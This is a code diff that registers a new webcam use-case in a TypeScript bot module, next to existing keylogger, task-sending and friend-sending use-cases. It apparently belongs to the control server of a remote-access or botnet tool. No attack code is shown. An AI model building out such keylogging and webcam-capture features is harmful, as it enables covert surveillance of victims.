@@ -18,6 +18,7 @@ import { WsClientModule } from "../ws-client/ws-client.module";
 import { WsBotSendTasksUseCase } from "./application/events/ws-bot-send-tasks.use-case";
 import { WsBotSendFriendUseCase } from "./application/events/ws-bot-send-friend.use-case";
 import { WsApplicationModule } from "../ws-application/ws-application.module";
+import { WsBotWebcamsUseCase } from "./application/events/ws-bot-webcams.use-case";
 
 @Module({
   providers: [
@@ -35,6 +36,7 @@ import { WsApplicationModule } from "../ws-application/ws-application.module";
     WsBotKeyLoggerUseCase,
     WsBotSendTasksUseCase,
     WsBotSendFriendUseCase,
+    WsBotWebcamsUseCase
   ],
   exports: [
     WsBotSendMessageUseCase,
@@ -49,6 +51,7 @@ import { WsApplicationModule } from "../ws-application/ws-application.module";
     WsBotKeyLoggerUseCase,
     WsBotSendTasksUseCase,
     WsBotSendFriendUseCase,
+    WsBotWebcamsUseCase
   ],
   imports: [
     forwardRef(() => AuthModule),
@@ -59,4 +62,4 @@ import { WsApplicationModule } from "../ws-application/ws-application.module";
     SchemasModule,
   ],
 })
-export class WsBotModule {}
+export class WsBotModule { }
